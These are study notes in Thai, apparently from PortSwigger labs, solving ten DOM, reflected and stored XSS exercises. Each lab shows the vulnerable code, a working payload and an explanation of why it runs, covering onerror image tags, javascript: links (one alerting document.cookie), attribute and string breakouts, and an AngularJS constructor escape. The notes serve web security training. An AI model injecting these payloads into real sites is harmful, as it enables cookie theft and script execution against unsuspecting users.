# 💥 1. DOM XSS (10 Labs)

## 🧠 DOM XSS คืออะไร?
JavaScript เอาข้อมูลของเรา (user input) ไปใส่ในหน้าเว็บ **แบบไม่กรอง** → payload ของเราถูก execute

### Event Triggers ที่ควรรู้
| Event | ทำงานเมื่อ |
|-------|----------|
| `onclick` | คลิก |
| `onmouseover` | เอาเมาส์ไปวาง (ไม่ต้องคลิก) |
| `onload` | โหลดหน้าเสร็จ (ไม่ต้องทำอะไรเลย) |
| `onerror` | โหลด resource ล้มเหลว |
| `onfocus` | ได้รับ focus (ใช้กับ `autofocus`) |
| `onresize` | ขนาดเปลี่ยน |
| `onanimationstart` | CSS animation เริ่ม |

---

## 🎭 Event Handlers (หลบหนีเพื่อเอาคำสั่งไปรัน)

| Context | Escape Pattern |
|---------|---------------|
| HTML | `"onmouseover="alert(1)"` |
| JavaScript | `';alert(1)//` |

---

## 🧪 Lab 1: DOM XSS via `document.write` + `location.search`

### Payload
```html
<noembed>
  <img title="</noembed><img src onerror=alert(1)>">
</noembed>
```

### อธิบาย
- `<noembed>` → บอก browser ไม่ต้องแสดงข้างใน
- `<img title="...">` → รูปที่มี title
- `<img src onerror=alert(1)>` → รูปโหลดพัง → `onerror` ทำงาน → `alert(1)` 💥

---

## 🧪 Lab 2: DOM XSS via `innerHTML` + `location.search`

### Source code ที่เจอ
```javascript
document.getElementById("academyLabHeader").innerHTML = evt.data;
```

### สิ่งที่เกิดขึ้น
1. WebSocket ส่งข้อมูลมา → `evt.data`
2. JS เอาไปใส่ในหน้าเว็บ
3. ใช้ `innerHTML` → browser **แปลเป็น HTML ทันที**

### Payload
```html
<img src=1 onerror=alert(1)>
```
หรือ
```html
<script>alert(document.domain)</script>
```

- `alert(document.domain)` → แสดง domain
- `<img src=1>` → โหลดรูปจาก URL `1` → โหลดไม่ได้ → `alert(1)` ขึ้น

---

## 🧪 Lab 3: DOM XSS in jQuery `href` attribute

### Source
```javascript
$('a').attr('href', returnPath)
```
→ attacker คุมค่า `href` ของ `<a>` ได้

### Payload
```
javascript:alert(document.cookie)
```

### ผลลัพธ์ HTML
```html
<a href="javascript:alert(document.cookie)">Back</a>
```
💥 → alert cookie

---

## 🧪 Lab 4: DOM XSS via jQuery selector + hashchange event

### Source
```javascript
$(window).on('hashchange', function(){
  var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
  if (post) post.get(0).scrollIntoView();
});
```

### อธิบาย
- `$(window).on('hashchange', function() {...})` → ทุกครั้งที่ URL เปลี่ยน `page.com/` → `page.com/#something` function ทำงาน
- `scrollIntoView()` → ถ้าเจอ element → เลื่อน browser ไปโชว์

### Payload (ใส่ท้าย URL)
```html
<img src=x onerror=print()>
```

ทำให้ selector กลายเป็น:
```javascript
$('section.blog-list h2:contains(anything<img src=x onerror=print()>)')
```
→ `src=x` โหลดไม่ได้ → `onerror=print()` ทำงาน ✅

---

## 🧪 Lab 5: Reflected XSS into attribute with angle brackets HTML-encoded

### HTML ก่อน inject
```html
<input value="">
```

### Payload
```
"autofocus onfocus="alert(1)
```

### HTML หลัง inject
```html
<input value="" autofocus onfocus="alert(1)">
```
- `"` → ปิด attribute `value` เดิม
- `autofocus` → บังคับให้ focus ทันที (ไม่ต้องรอ user)
- `onfocus="alert(1)"` → รันตอน focus

---

## 🧪 Lab 6: Stored XSS in anchor `href` attribute (double quotes HTML-encoded)

### วิธี
ใส่ xss ใน **body** แล้วใส่ใน **website field**:
```
javascript:alert(1)
```

### ผลลัพธ์ HTML
```html
<a href="javascript:alert(1)">ชื่อ author</a>
```

→ หลุดออกจาก attribute ได้ → script หลบการตรวจสอบ

---

## 🧪 Lab 7: Reflected XSS into JavaScript string (angle brackets encoded)

### หลักการ
หลอกว่าจบคำสั่งแล้ว แต่มีอย่างอื่นแฝงข้างหลัง

### Payload
```javascript
';alert(1)//
```

### อธิบาย
- `'` → ปิด String
- `;` → จบคำสั่ง
- `alert(1)` → คำสั่งที่เราใส่
- `//` → comment ไม่ให้ส่วนที่เหลือ error

---

## 🧪 Lab 8: DOM XSS in `document.write` inside `<select>` element

### Source
```javascript
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
document.write('<option selected>' + store + '</option>');
```

### ปัญหา
เอาค่า URL param มาใช้ตรงๆ → ใส่อะไรก็ได้

### Payload
```
&storeId="></select><img%20src=1%20onerror=alert(1)>
```

### ผลลัพธ์
```html
<select name="storeId">
  <option selected>"></select><img src=1 onerror=alert(1)></option>
</select>
```

- `"></select>` → ปิด `<select>` element ที่ครอบอยู่
- `<img src=1 onerror=alert(1)>` → รัน script

---

## 🧪 Lab 9: DOM XSS in AngularJS expression

### หลักการ
ถ้าเห็น syntax `{{...}}` → AngularJS เอาไปประมวลผล

### Payload
```
{{constructor.constructor('alert(1)')()}}
```

### อธิบาย
- `constructor` = ตัวสร้าง
- สามารถไปต่อ `object → constructor → function` → ของทรงพลัง

---

## 🧪 Lab 10: Reflected DOM XSS

### Source code ที่เจอ
```javascript
var searchResultsObj = {"searchTerm":"USER_INPUT","results":[]}
```

### Payload
```
\"-alert(1)}//
```

### ผลลัพธ์
```javascript
var searchResultsObj = {"searchTerm":"\"-alert(1)}//","results":[]}
```

### อธิบาย
- `\"` → `"` + `"` = `""` → ปิด String
- `-` → เชื่อมไม่ให้ syntax error
- `}` → ปิด `{` ของ object → `{"searchTerm":""-alert(1)}`
- `//` → comment ส่วนที่เหลือ

---

## 🔗 ดูเพิ่ม
- [[02-Event-Triggers|Event Triggers (load/focus/animation)]]
- [[../Concepts/Source-Sink|Source → Sink]]
- [[../Concepts/Sink-Cheatsheet|Sink Cheatsheet]]

#xss #dom-xss #portswigger
